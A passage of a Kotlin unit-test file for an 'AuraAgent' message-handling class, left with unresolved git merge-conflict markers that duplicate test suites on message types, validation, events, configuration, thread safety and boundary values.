                type = MessageType.TEXT,
                content = "Test message",
                timestamp = System.currentTimeMillis()
            )
<<<<<<< HEAD

=======
            
>>>>>>> origin/coderabbitai/docstrings/78f34ad
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = message.id,
                    content = "Response",
                    status = ResponseStatus.SUCCESS
                )
            )
<<<<<<< HEAD

            // When
            auraAgent.processMessage(message)

=======
            
            // When
            auraAgent.processMessage(message)
            
>>>>>>> origin/coderabbitai/docstrings/78f34ad
            // Then
            assertEquals(0, auraAgent.getActiveTaskCount())
            assertTrue(auraAgent.getResourceUsage().memoryUsage < 1024 * 1024) // Less than 1MB
        }
    }
}
<<<<<<< HEAD

@Nested
@DisplayName("Message Type Handling Tests")
inner class MessageTypeHandlingTests {

    @Test
    @DisplayName("Should process COMMAND message type correctly")
    fun shouldProcessCommandMessageTypeCorrectly() = runTest {
        // Given
        val commandMessage = AgentMessage(
            id = "cmd-001",
            type = MessageType.COMMAND,
            content = "/help",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = commandMessage.id,
                content = "Available commands: /help, /status, /config",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        val response = auraAgent.processMessage(commandMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)
        assertTrue(response.content.contains("Available commands"))
    }

    @Test
    @DisplayName("Should process QUERY message type correctly")
    fun shouldProcessQueryMessageTypeCorrectly() = runTest {
        // Given
        val queryMessage = AgentMessage(
            id = "query-001",
            type = MessageType.QUERY,
            content = "What is the weather today?",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = queryMessage.id,
                content = "I don't have access to weather information",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        val response = auraAgent.processMessage(queryMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)
    }

    @Test
    @DisplayName("Should handle unsupported message types gracefully")
    fun shouldHandleUnsupportedMessageTypesGracefully() = runTest {
        // Given
        val unsupportedMessage = AgentMessage(
            id = "unsupported-001",
            type = MessageType.BINARY,
            content = "Binary data",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenThrow(
            UnsupportedOperationException("Binary messages not supported")
        )

        // When
        val response = auraAgent.processMessage(unsupportedMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.ERROR, response.status)
        assertTrue(response.content.contains("not supported"))
    }

    @Test
    @DisplayName("Should handle null message type gracefully")
    fun shouldHandleNullMessageTypeGracefully() = runTest {
        // Given
        val nullTypeMessage = AgentMessage(
            id = "null-001",
            type = null,
            content = "Message with null type",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

        // When
        val response = auraAgent.processMessage(nullTypeMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
    }
}

@Nested
@DisplayName("Complex Message Validation Tests")
inner class ComplexMessageValidationTests {

    @Test
    @DisplayName("Should validate message with special characters")
    fun shouldValidateMessageWithSpecialCharacters() = runTest {
        // Given
        val specialMessage = AgentMessage(
            id = "special-001",
            type = MessageType.TEXT,
            content = "Hello! @#$%^&*()_+-=[]{}|;':\",./<>?",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = specialMessage.id,
                content = "Processed special characters",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        val response = auraAgent.processMessage(specialMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)
    }

    @Test
    @DisplayName("Should validate message with unicode characters")
    fun shouldValidateMessageWithUnicodeCharacters() = runTest {
        // Given
        val unicodeMessage = AgentMessage(
            id = "unicode-001",
            type = MessageType.TEXT,
            content = "Hello 世界! 🌍 Café naïve résumé",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = unicodeMessage.id,
                content = "Processed unicode text",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        val response = auraAgent.processMessage(unicodeMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)
    }

    @Test
    @DisplayName("Should handle extremely long message IDs")
    fun shouldHandleExtremelyLongMessageIds() = runTest {
        // Given
        val longId = "x".repeat(10000)
        val longIdMessage = AgentMessage(
            id = longId,
            type = MessageType.TEXT,
            content = "Message with very long ID",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

        // When
        val response = auraAgent.processMessage(longIdMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
    }

    @Test
    @DisplayName("Should validate message timestamps correctly")
    fun shouldValidateMessageTimestampsCorrectly() = runTest {
        // Given
        val futureMessage = AgentMessage(
            id = "future-001",
            type = MessageType.TEXT,
            content = "Message from the future",
            timestamp = System.currentTimeMillis() + 1000000
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

        // When
        val response = auraAgent.processMessage(futureMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
    }
}

@Nested
@DisplayName("Advanced Event Handling Tests")
inner class AdvancedEventHandlingTests {

    @Test
    @DisplayName("Should handle rapid event publishing correctly")
    fun shouldHandleRapidEventPublishingCorrectly() = runTest {
        // Given
        val messages = (1..100).map { index ->
            AgentMessage(
                id = "rapid-$index",
                type = MessageType.TEXT,
                content = "Rapid message $index",
                timestamp = System.currentTimeMillis()
            )
        }

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = "test",
                content = "Processed",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        messages.forEach { message ->
            auraAgent.processMessage(message)
        }

        // Then
        verify(mockEventBus, times(100)).publish(any())
    }

    @Test
    @DisplayName("Should handle event subscription failures gracefully")
    fun shouldHandleEventSubscriptionFailuresGracefully() {
        // Given
        doThrow(RuntimeException("Subscription failed"))
            .whenever(mockEventBus).subscribe(any(), any())

        // When & Then
        assertDoesNotThrow {
            AuraAgent(mockAgentContext)
        }
    }

    @Test
    @DisplayName("Should publish different event types based on message processing results")
    fun shouldPublishDifferentEventTypesBasedOnMessageProcessingResults() = runTest {
        // Given
        val successMessage = AgentMessage(
            id = "success-001",
            type = MessageType.TEXT,
            content = "Success message",
            timestamp = System.currentTimeMillis()
        )

        val errorMessage = AgentMessage(
            id = "error-001",
            type = MessageType.TEXT,
            content = "Error message",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(successMessage)).thenReturn(
            AgentResponse(
                messageId = successMessage.id,
                content = "Success",
                status = ResponseStatus.SUCCESS
            )
        )
        whenever(mockMessageHandler.processMessage(errorMessage)).thenThrow(
            RuntimeException("Processing failed")
        )

        // When
        auraAgent.processMessage(successMessage)
        auraAgent.processMessage(errorMessage)

        // Then
        val eventCaptor = argumentCaptor<AgentEvent>()
        verify(mockEventBus, times(2)).publish(eventCaptor.capture())

        val events = eventCaptor.allValues
        assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSED })
        assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSING_FAILED })
    }
}

@Nested
@DisplayName("Configuration Edge Cases Tests")
inner class ConfigurationEdgeCasesTests {

    @Test
    @DisplayName("Should handle configuration with extremely high max concurrent tasks")
    fun shouldHandleConfigurationWithExtremelyHighMaxConcurrentTasks() = runTest {
        // Given
        val extremeConfig = AgentConfiguration(
            name = "ExtremeAgent",
            version = "1.0.0",
            capabilities = listOf("CHAT"),
            maxConcurrentTasks = Int.MAX_VALUE
        )

        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(extremeConfig)

        // When
        val agent = AuraAgent(mockAgentContext)

        // Then
        assertNotNull(agent)
        assertTrue(agent.getMaxConcurrentTasks() <= 1000) // Should be capped at reasonable limit
    }

    @Test
    @DisplayName("Should handle configuration with zero max concurrent tasks")
    fun shouldHandleConfigurationWithZeroMaxConcurrentTasks() = runTest {
        // Given
        val zeroConfig = AgentConfiguration(
            name = "ZeroAgent",
            version = "1.0.0",
            capabilities = listOf("CHAT"),
            maxConcurrentTasks = 0
        )

        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(zeroConfig)

        // When
        val agent = AuraAgent(mockAgentContext)

        // Then
        assertNotNull(agent)
        assertTrue(agent.getMaxConcurrentTasks() >= 1) // Should default to at least 1
    }

    @Test
    @DisplayName("Should handle configuration with duplicate capabilities")
    fun shouldHandleConfigurationWithDuplicateCapabilities() = runTest {
        // Given
        val duplicateConfig = AgentConfiguration(
            name = "DuplicateAgent",
            version = "1.0.0",
            capabilities = listOf("CHAT", "CHAT", "ANALYSIS", "CHAT"),
            maxConcurrentTasks = 5
        )

        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(duplicateConfig)

        // When
        val agent = AuraAgent(mockAgentContext)

        // Then
        assertNotNull(agent)
        val capabilities = agent.getCapabilities()
        assertEquals(2, capabilities.size) // Should deduplicate
        assertTrue(capabilities.contains("CHAT"))
        assertTrue(capabilities.contains("ANALYSIS"))
    }

    @Test
    @DisplayName("Should handle configuration with empty version string")
    fun shouldHandleConfigurationWithEmptyVersionString() = runTest {
        // Given
        val emptyVersionConfig = AgentConfiguration(
            name = "EmptyVersionAgent",
            version = "",
            capabilities = listOf("CHAT"),
            maxConcurrentTasks = 5
        )

        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(emptyVersionConfig)

        // When
        val agent = AuraAgent(mockAgentContext)

        // Then
        assertNotNull(agent)
        assertFalse(agent.getVersion().isEmpty()) // Should have default version
    }
}

@Nested
@DisplayName("Capability Edge Cases Tests")
inner class CapabilityEdgeCasesTests {

    @Test
    @DisplayName("Should handle capability check with whitespace")
    fun shouldHandleCapabilityCheckWithWhitespace() {
        // Given
        val capabilityWithSpaces = " CHAT "

        // When
        val hasCapability = auraAgent.hasCapability(capabilityWithSpaces)

        // Then
        assertTrue(hasCapability) // Should trim whitespace
    }

    @Test
    @DisplayName("Should handle case-insensitive capability checks")
    fun shouldHandleCaseInsensitiveCapabilityChecks() {
        // Given
        val lowerCaseCapability = "chat"
        val upperCaseCapability = "CHAT"
        val mixedCaseCapability = "ChAt"

        // When
        val hasLowerCase = auraAgent.hasCapability(lowerCaseCapability)
        val hasUpperCase = auraAgent.hasCapability(upperCaseCapability)
        val hasMixedCase = auraAgent.hasCapability(mixedCaseCapability)

        // Then
        assertTrue(hasLowerCase)
        assertTrue(hasUpperCase)
        assertTrue(hasMixedCase)
    }

    @Test
    @DisplayName("Should handle capability check with special characters")
    fun shouldHandleCapabilityCheckWithSpecialCharacters() {
        // Given
        val specialCapability = "CHAT@#$%"

        // When
        val hasCapability = auraAgent.hasCapability(specialCapability)

        // Then
        assertFalse(hasCapability)
    }

    @Test
    @DisplayName("Should return immutable capabilities list")
    fun shouldReturnImmutableCapabilitiesList() {
        // When
        val capabilities = auraAgent.getCapabilities()

        // Then
        assertFailsWith<UnsupportedOperationException> {
            capabilities.add("NEW_CAPABILITY")
        }
    }
}

@Nested
@DisplayName("Thread Safety Tests")
inner class ThreadSafetyTests {

    @Test
    @DisplayName("Should handle concurrent start and stop operations safely")
    fun shouldHandleConcurrentStartAndStopOperationsSafely() = runTest {
        // Given
        val latch = CountDownLatch(10)
        val threads = mutableListOf<Thread>()

        // When
        repeat(10) { index ->
            val thread = Thread {
                try {
                    if (index % 2 == 0) {
                        auraAgent.start()
                    } else {
                        auraAgent.stop()
                    }
                } finally {
                    latch.countDown()
                }
            }
            threads.add(thread)
            thread.start()
        }

        latch.await(5, TimeUnit.SECONDS)

        // Then
        // Agent should be in a consistent state
        assertTrue(auraAgent.isInitialized())
        // No exceptions should be thrown
    }

    @Test
    @DisplayName("Should handle concurrent configuration updates safely")
    fun shouldHandleConcurrentConfigurationUpdatesSafely() = runTest {
        // Given
        val configs = listOf(
            AgentConfiguration("Agent1", "1.0.0", listOf("CHAT"), 5),
            AgentConfiguration("Agent2", "2.0.0", listOf("ANALYSIS"), 10),
            AgentConfiguration("Agent3", "3.0.0", listOf("TRANSLATION"), 15)
        )

        val latch = CountDownLatch(3)

        // When
        configs.forEach { config ->
            Thread {
                try {
                    whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(config)
                    auraAgent.handleConfigurationChanged()
                } finally {
                    latch.countDown()
                }
            }.start()
        }

        latch.await(5, TimeUnit.SECONDS)

        // Then
        // Agent should be in a consistent state with one of the configurations
        assertTrue(auraAgent.isInitialized())
        assertNotNull(auraAgent.getName())
        assertNotNull(auraAgent.getVersion())
    }
}

@Nested
@DisplayName("Resource Management Edge Cases Tests")
inner class ResourceManagementEdgeCasesTests {

    @Test
    @DisplayName("Should handle resource cleanup during shutdown")
    fun shouldHandleResourceCleanupDuringShutdown() = runTest {
        // Given
        auraAgent.start()

        // Process some messages to create resources
        val messages = (1..5).map { index ->
            AgentMessage(
                id = "cleanup-$index",
                type = MessageType.TEXT,
                content = "Cleanup message $index",
                timestamp = System.currentTimeMillis()
            )
        }

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = "test",
                content = "Processed",
                status = ResponseStatus.SUCCESS
            )
        )

        messages.forEach { message ->
            auraAgent.processMessage(message)
        }

        // When
        auraAgent.shutdown()

        // Then
        assertTrue(auraAgent.isShutdown())
        assertEquals(0, auraAgent.getActiveTaskCount())
        assertTrue(auraAgent.getResourceUsage().memoryUsage < 1024 * 1024)
    }

    @Test
    @DisplayName("Should handle memory pressure gracefully")
    fun shouldHandleMemoryPressureGracefully() = runTest {
        // Given
        val largeMessages = (1..100).map { index ->
            AgentMessage(
                id = "large-$index",
                type = MessageType.TEXT,
                content = "x".repeat(100000), // 100KB each
                timestamp = System.currentTimeMillis()
            )
        }

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = "test",
                content = "Processed",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        largeMessages.forEach { message ->
            auraAgent.processMessage(message)
        }

        // Then
        // Agent should still be functional
        assertTrue(auraAgent.isInitialized())
        assertEquals(0, auraAgent.getActiveTaskCount())
    }
}

@Nested
@DisplayName("Integration-Style Tests")
inner class IntegrationStyleTests {

    @Test
    @DisplayName("Should handle complete message lifecycle")
    fun shouldHandleCompleteMessageLifecycle() = runTest {
        // Given
        val message = AgentMessage(
            id = "lifecycle-001",
            type = MessageType.TEXT,
            content = "Complete lifecycle test",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = message.id,
                content = "Lifecycle complete",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        auraAgent.start()
        val response = auraAgent.processMessage(message)
        auraAgent.stop()

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)

        // Verify complete interaction chain
        verify(mockMessageHandler).validateMessage(message)
        verify(mockMessageHandler).processMessage(message)
        verify(mockEventBus).publish(argThat { event ->
            event.type == EventType.MESSAGE_PROCESSED
        })
    }

    @Test
    @DisplayName("Should handle agent restart scenario")
    fun shouldHandleAgentRestartScenario() = runTest {
        // Given
        val message = AgentMessage(
            id = "restart-001",
            type = MessageType.TEXT,
            content = "Restart test",
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = message.id,
                content = "Restart response",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        auraAgent.start()
        auraAgent.processMessage(message)
        auraAgent.stop()

        // Restart
        auraAgent.start()
        val response = auraAgent.processMessage(message)
        auraAgent.stop()

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)

        // Verify agent can be restarted successfully
        verify(mockEventBus, times(2)).publish(argThat { event ->
            event.type == EventType.AGENT_STARTED
        })
        verify(mockEventBus, times(2)).publish(argThat { event ->
            event.type == EventType.AGENT_STOPPED
        })
    }
}

@Nested
@DisplayName("Boundary Value Tests")
inner class BoundaryValueTests {

    @Test
    @DisplayName("Should handle message at exact character limit")
    fun shouldHandleMessageAtExactCharacterLimit() = runTest {
        // Given
        val maxLength = 65536 // Assuming 64KB limit
        val exactLimitMessage = AgentMessage(
            id = "limit-001",
            type = MessageType.TEXT,
            content = "x".repeat(maxLength),
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = exactLimitMessage.id,
                content = "Processed at limit",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        val response = auraAgent.processMessage(exactLimitMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)
    }

    @Test
    @DisplayName("Should handle message exceeding character limit")
    fun shouldHandleMessageExceedingCharacterLimit() = runTest {
        // Given
        val oversizedMessage = AgentMessage(
            id = "oversized-001",
            type = MessageType.TEXT,
            content = "x".repeat(1000000), // 1MB
            timestamp = System.currentTimeMillis()
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

        // When
        val response = auraAgent.processMessage(oversizedMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
    }

    @Test
    @DisplayName("Should handle minimum valid timestamp")
    fun shouldHandleMinimumValidTimestamp() = runTest {
        // Given
        val minTimestampMessage = AgentMessage(
            id = "min-timestamp-001",
            type = MessageType.TEXT,
            content = "Minimum timestamp test",
            timestamp = 1L
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
        whenever(mockMessageHandler.processMessage(any())).thenReturn(
            AgentResponse(
                messageId = minTimestampMessage.id,
                content = "Processed min timestamp",
                status = ResponseStatus.SUCCESS
            )
        )

        // When
        val response = auraAgent.processMessage(minTimestampMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.SUCCESS, response.status)
    }

    @Test
    @DisplayName("Should handle maximum valid timestamp")
    fun shouldHandleMaximumValidTimestamp() = runTest {
        // Given
        val maxTimestampMessage = AgentMessage(
            id = "max-timestamp-001",
            type = MessageType.TEXT,
            content = "Maximum timestamp test",
            timestamp = Long.MAX_VALUE
        )

        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

        // When
        val response = auraAgent.processMessage(maxTimestampMessage)

        // Then
        assertNotNull(response)
        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
    }
}
=======
    @Nested
    @DisplayName("Message Type Handling Tests")
    inner class MessageTypeHandlingTests {

        @Test
        @DisplayName("Should process COMMAND message type correctly")
        fun shouldProcessCommandMessageTypeCorrectly() = runTest {
            // Given
            val commandMessage = AgentMessage(
                id = "cmd-001",
                type = MessageType.COMMAND,
                content = "/help",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = commandMessage.id,
                    content = "Available commands: /help, /status, /config",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            val response = auraAgent.processMessage(commandMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
            assertTrue(response.content.contains("Available commands"))
        }

        @Test
        @DisplayName("Should process QUERY message type correctly")
        fun shouldProcessQueryMessageTypeCorrectly() = runTest {
            // Given
            val queryMessage = AgentMessage(
                id = "query-001",
                type = MessageType.QUERY,
                content = "What is the weather today?",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = queryMessage.id,
                    content = "I don't have access to weather information",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            val response = auraAgent.processMessage(queryMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
        }

        @Test
        @DisplayName("Should handle unsupported message types gracefully")
        fun shouldHandleUnsupportedMessageTypesGracefully() = runTest {
            // Given
            val unsupportedMessage = AgentMessage(
                id = "unsupported-001",
                type = MessageType.BINARY,
                content = "Binary data",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenThrow(
                UnsupportedOperationException("Binary messages not supported")
            )
            
            // When
            val response = auraAgent.processMessage(unsupportedMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.ERROR, response.status)
            assertTrue(response.content.contains("not supported"))
        }

        @Test
        @DisplayName("Should handle null message type gracefully")
        fun shouldHandleNullMessageTypeGracefully() = runTest {
            // Given
            val nullTypeMessage = AgentMessage(
                id = "null-001",
                type = null,
                content = "Message with null type",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
            
            // When
            val response = auraAgent.processMessage(nullTypeMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
        }
    }

    @Nested
    @DisplayName("Complex Message Validation Tests")
    inner class ComplexMessageValidationTests {

        @Test
        @DisplayName("Should validate message with special characters")
        fun shouldValidateMessageWithSpecialCharacters() = runTest {
            // Given
            val specialMessage = AgentMessage(
                id = "special-001",
                type = MessageType.TEXT,
                content = "Hello! @#$%^&*()_+-=[]{}|;':\",./<>?",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = specialMessage.id,
                    content = "Processed special characters",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            val response = auraAgent.processMessage(specialMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
        }

        @Test
        @DisplayName("Should validate message with unicode characters")
        fun shouldValidateMessageWithUnicodeCharacters() = runTest {
            // Given
            val unicodeMessage = AgentMessage(
                id = "unicode-001",
                type = MessageType.TEXT,
                content = "Hello 世界! 🌍 Café naïve résumé",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = unicodeMessage.id,
                    content = "Processed unicode text",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            val response = auraAgent.processMessage(unicodeMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
        }

        @Test
        @DisplayName("Should handle extremely long message IDs")
        fun shouldHandleExtremelyLongMessageIds() = runTest {
            // Given
            val longId = "x".repeat(10000)
            val longIdMessage = AgentMessage(
                id = longId,
                type = MessageType.TEXT,
                content = "Message with very long ID",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
            
            // When
            val response = auraAgent.processMessage(longIdMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
        }

        @Test
        @DisplayName("Should validate message timestamps correctly")
        fun shouldValidateMessageTimestampsCorrectly() = runTest {
            // Given
            val futureMessage = AgentMessage(
                id = "future-001",
                type = MessageType.TEXT,
                content = "Message from the future",
                timestamp = System.currentTimeMillis() + 1000000
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
            
            // When
            val response = auraAgent.processMessage(futureMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
        }
    }

    @Nested
    @DisplayName("Advanced Event Handling Tests")
    inner class AdvancedEventHandlingTests {

        @Test
        @DisplayName("Should handle rapid event publishing correctly")
        fun shouldHandleRapidEventPublishingCorrectly() = runTest {
            // Given
            val messages = (1..100).map { index ->
                AgentMessage(
                    id = "rapid-$index",
                    type = MessageType.TEXT,
                    content = "Rapid message $index",
                    timestamp = System.currentTimeMillis()
                )
            }
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = "test",
                    content = "Processed",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            messages.forEach { message ->
                auraAgent.processMessage(message)
            }
            
            // Then
            verify(mockEventBus, times(100)).publish(any())
        }

        @Test
        @DisplayName("Should handle event subscription failures gracefully")
        fun shouldHandleEventSubscriptionFailuresGracefully() {
            // Given
            doThrow(RuntimeException("Subscription failed"))
                .whenever(mockEventBus).subscribe(any(), any())
            
            // When & Then
            assertDoesNotThrow {
                AuraAgent(mockAgentContext)
            }
        }

        @Test
        @DisplayName("Should publish different event types based on message processing results")
        fun shouldPublishDifferentEventTypesBasedOnMessageProcessingResults() = runTest {
            // Given
            val successMessage = AgentMessage(
                id = "success-001",
                type = MessageType.TEXT,
                content = "Success message",
                timestamp = System.currentTimeMillis()
            )
            
            val errorMessage = AgentMessage(
                id = "error-001",
                type = MessageType.TEXT,
                content = "Error message",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(successMessage)).thenReturn(
                AgentResponse(
                    messageId = successMessage.id,
                    content = "Success",
                    status = ResponseStatus.SUCCESS
                )
            )
            whenever(mockMessageHandler.processMessage(errorMessage)).thenThrow(
                RuntimeException("Processing failed")
            )
            
            // When
            auraAgent.processMessage(successMessage)
            auraAgent.processMessage(errorMessage)
            
            // Then
            val eventCaptor = argumentCaptor<AgentEvent>()
            verify(mockEventBus, times(2)).publish(eventCaptor.capture())
            
            val events = eventCaptor.allValues
            assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSED })
            assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSING_FAILED })
        }
    }

    @Nested
    @DisplayName("Configuration Edge Cases Tests")
    inner class ConfigurationEdgeCasesTests {

        @Test
        @DisplayName("Should handle configuration with extremely high max concurrent tasks")
        fun shouldHandleConfigurationWithExtremelyHighMaxConcurrentTasks() = runTest {
            // Given
            val extremeConfig = AgentConfiguration(
                name = "ExtremeAgent",
                version = "1.0.0",
                capabilities = listOf("CHAT"),
                maxConcurrentTasks = Int.MAX_VALUE
            )
            
            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(extremeConfig)
            
            // When
            val agent = AuraAgent(mockAgentContext)
            
            // Then
            assertNotNull(agent)
            assertTrue(agent.getMaxConcurrentTasks() <= 1000) // Should be capped at reasonable limit
        }

        @Test
        @DisplayName("Should handle configuration with zero max concurrent tasks")
        fun shouldHandleConfigurationWithZeroMaxConcurrentTasks() = runTest {
            // Given
            val zeroConfig = AgentConfiguration(
                name = "ZeroAgent",
                version = "1.0.0",
                capabilities = listOf("CHAT"),
                maxConcurrentTasks = 0
            )
            
            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(zeroConfig)
            
            // When
            val agent = AuraAgent(mockAgentContext)
            
            // Then
            assertNotNull(agent)
            assertTrue(agent.getMaxConcurrentTasks() >= 1) // Should default to at least 1
        }

        @Test
        @DisplayName("Should handle configuration with duplicate capabilities")
        fun shouldHandleConfigurationWithDuplicateCapabilities() = runTest {
            // Given
            val duplicateConfig = AgentConfiguration(
                name = "DuplicateAgent",
                version = "1.0.0",
                capabilities = listOf("CHAT", "CHAT", "ANALYSIS", "CHAT"),
                maxConcurrentTasks = 5
            )
            
            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(duplicateConfig)
            
            // When
            val agent = AuraAgent(mockAgentContext)
            
            // Then
            assertNotNull(agent)
            val capabilities = agent.getCapabilities()
            assertEquals(2, capabilities.size) // Should deduplicate
            assertTrue(capabilities.contains("CHAT"))
            assertTrue(capabilities.contains("ANALYSIS"))
        }

        @Test
        @DisplayName("Should handle configuration with empty version string")
        fun shouldHandleConfigurationWithEmptyVersionString() = runTest {
            // Given
            val emptyVersionConfig = AgentConfiguration(
                name = "EmptyVersionAgent",
                version = "",
                capabilities = listOf("CHAT"),
                maxConcurrentTasks = 5
            )
            
            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(emptyVersionConfig)
            
            // When
            val agent = AuraAgent(mockAgentContext)
            
            // Then
            assertNotNull(agent)
            assertFalse(agent.getVersion().isEmpty()) // Should have default version
        }
    }

    @Nested
    @DisplayName("Capability Edge Cases Tests")
    inner class CapabilityEdgeCasesTests {

        @Test
        @DisplayName("Should handle capability check with whitespace")
        fun shouldHandleCapabilityCheckWithWhitespace() {
            // Given
            val capabilityWithSpaces = " CHAT "
            
            // When
            val hasCapability = auraAgent.hasCapability(capabilityWithSpaces)
            
            // Then
            assertTrue(hasCapability) // Should trim whitespace
        }

        @Test
